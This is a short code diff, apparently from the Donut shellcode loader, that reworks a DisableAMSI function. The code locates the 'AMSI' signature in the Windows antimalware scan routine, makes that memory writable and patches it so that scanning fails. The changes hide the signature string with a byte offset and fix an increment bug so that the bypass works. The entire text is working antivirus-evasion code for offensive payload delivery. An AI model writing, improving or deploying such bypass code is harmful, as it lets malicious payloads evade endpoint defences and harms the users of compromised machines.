@@ -177,12 +177,14 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     // FALSE because it should exist.
     cs = (PBYTE)xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
     if(cs == NULL) return FALSE;
-    
+
     // scan for signature
-    for(i=0;;i++) {
+    for(i=0;i<255;i++) 
+    {
       Signature = (PDWORD)&cs[i];
       // is it "AMSI"?
-      if(*Signature == *(PDWORD)inst->amsi) {
+      if(cs[i]==inst->amsi[0]-32 && cs[i+1]==inst->amsi[1]-32 && cs[i+2]==inst->amsi[2]-32 && cs[i+3]==inst->amsi[3]-32 )
+      {
         // set memory protection for write access
         ba = cs;
         rs = sizeof(DWORD);
@@ -190,7 +192,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
         if(!NT_SUCCESS(status)) return FALSE;
           
         // change signature
-        *Signature++;
+        (*Signature)++;
         
         // set memory back to original protection
         NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t, syscall_list);
